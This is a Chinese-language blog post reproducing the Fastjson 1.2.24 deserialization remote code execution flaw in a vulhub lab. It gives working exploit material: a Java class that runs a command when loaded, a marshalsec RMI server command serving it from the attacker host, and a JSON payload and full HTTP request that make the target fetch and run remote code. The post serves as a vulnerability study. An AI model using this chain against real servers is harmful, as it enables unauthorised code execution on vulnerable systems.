---
layout: post
title: Fastjsonv1.2.24远程命令执行
categories: [安全漏洞]
description: Fastjsonv1.2.24远程命令执行

keywords: 安全漏洞, fastjson
---



# 前言

**漏洞描述**
FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。

在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

**漏洞影响版本**

fastjson <= 1.2.24

## 准备环境


Fastjson <= 1.2.47 远程命令执行漏洞利用工具及方法，以及避开坑点

以下操作均在Ubuntu 18下亲测可用，openjdk需要切换到8，且使用8的javac

- java
  
```
> java -version
openjdk versin "1.8.0_222"

> javac -version
javac 1.8.0_222
```

## 漏洞环境
靶场选择使用vulhub搭建，网址：<https://github.com/vulhub/vulhub>

下载 vulhub ，找到 `fastjson/1.2.24-rce 目录`，使用docker-compose up -d启动环境。


## 漏洞复现

1. 编写恶意类

在攻击机上编写恶意类代码 `TouchFile.java`

```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
 static {
     try {
         Runtime rt = Runtime.getRuntime();
         String[] commands = {"touch", "/tmp/EDI"};
         Process pc = rt.exec(commands);
         pc.waitFor();
     } catch (Exception e) {
     }
 }
}

```

然后 `javac TouchFile.java `编译一下，生成 `TouchFile.class`

![](https://img-blog.csdnimg.cn/88f9ab49874a40a8988a78f998bb0241.png)

使用 python 起一个http服务 `python -m SimpleHTTPServer 8888`

![](https://img-blog.csdnimg.cn/7a07f6f92925424f984f40dde31d785a.png)

2. 编译并开启RMI服务

- 下载 [marshalsec](https://github.com/mbechler/marshalsec) 项目 

java8 下，使用 maven 构建 `mvn clean package -DskipTests` 生成相应jar包

![](https://img-blog.csdnimg.cn/b8c45fc54cac4e1e8506e67ff5ab3211.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQmlnJkJpcmQ=,size_20,color_FFFFFF,t_70,g_se,x_16)


**启动RMI服务，监听 9999端口** ，并制定远程加载类TouchFile.class


```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击机IP:8888/#TouchFile" 9999

```

![](https://img-blog.csdnimg.cn/44f5743c5377421088902a9d0c84f511.png)



3. 抓包触发 fastjson 请求
访问 http://靶机:8090/ ，并通过bp抓包

修改请求方式为 POST, Content-Type 改成application/json，并写入exp，然后发送请求。


**payload:**

```
{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://攻击机IP:9999/TouchFile",
 "autoCommit":true
 }
}
```

**exp:**

```
POST / HTTP/1.1
Host: 192.168.42.200:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,hr;q=0.8,ru;q=0.7
Cookie: Hm_lvt_bc38887aa5588add05a38704342ad7e8=1646619039; 
Connection: close
Content-Type: application/json
Content-Length: 137

{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.42.200:9999/TouchFile",
 "autoCommit":true
 }
}
```

**响应：**

![](https://img-blog.csdnimg.cn/e30d605ff7e146f2a12959ce2561f585.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQmlnJkJpcmQ=,size_20,color_FFFFFF,t_70,g_se,x_16)